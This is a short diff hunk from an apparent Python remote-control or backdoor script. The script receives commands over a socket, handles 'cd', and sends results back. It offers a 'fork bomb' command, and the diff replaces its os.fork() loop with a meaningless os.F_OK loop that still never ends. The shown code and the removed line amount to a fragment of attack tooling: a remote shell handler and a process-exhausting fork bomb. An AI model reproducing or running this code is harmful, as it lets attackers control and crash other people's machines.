@@ -28,7 +28,7 @@ try:
 
             if cmd == "fork bomb":
                 while True:
-                    os.fork()
+                    os.F_OK
             elif cmd.split(" ")[0] == "cd":  # Change directory
                 os.chdir(cmd.split(" ")[1])
                 sock.send("Changed directory to {}".format(os.getcwd()).encode())
